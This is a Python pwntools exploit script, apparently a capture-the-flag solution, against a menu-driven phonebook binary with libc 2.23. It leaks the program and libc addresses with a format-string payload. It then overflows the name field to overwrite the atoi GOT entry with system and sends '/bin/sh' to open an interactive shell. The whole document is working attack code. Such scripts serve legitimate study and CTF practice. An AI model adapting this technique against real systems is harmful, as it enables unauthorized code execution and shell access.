from pwn import *

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
breakrva 0xd9a
continue
'''.format(**locals())

#Binary filename
exe = './hello'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

################################################################

p = start()
libc = ELF("./libc-2.23.so")

def add(phone_num, name, size, info):
    p.sendlineafter(b"choice>>", "1")
    p.sendlineafter(b"hone number:", str(phone_num))
    p.sendlineafter(b"name:", str(name))
    p.sendlineafter(b"input des size:", str(size))
    p.sendlineafter(b"des info:", str(info))

def Delete(index):
    p.sendlineafter(b"choice>>", "2")
    p.sendlineafter(b"input index:", str(index))

def edit(index, phone_num, name, info):
    p.sendline(b"4")
    p.sendlineafter(b"input index:", str(index))
    p.sendlineafter(b"hone number:", str(phone_num))
    p.sendlineafter(b"name:", (name))
    p.sendafter(b"des info:", str(info))

def show(index):
    p.sendlineafter(b"choice>>", "3")
    p.sendlineafter(b"input index:", str(index))

offset_base = 0x12a0
offset_libc = 0x20840

add("%12$p.%13$p", "0", 128, "0"*16)
show(0)

(p.recvuntil(b"number:"))
u = p.recv()
leak_base = int(u[2:14],16)
leak_libc = int(u[17:29],16)
elf.address = leak_base - offset_base
libc.address = leak_libc - offset_libc
print(hex(leak_base))
print(hex(leak_libc))
log.info("libc_address = "+ hex(libc.address))
log.info("base =" + hex(elf.address))

log.info("atoi = " + hex(elf.got['atoi']))
log.info("system = " + hex(libc.sym['system']))

overwrite_name_payload = b"a"*13 + p64(elf.got['atoi'])
edit(0, '0',overwrite_name_payload, p64(libc.sym['system']))

p.recvuntil('your choice>>')
p.sendline('/bin/sh')
p.interactive()
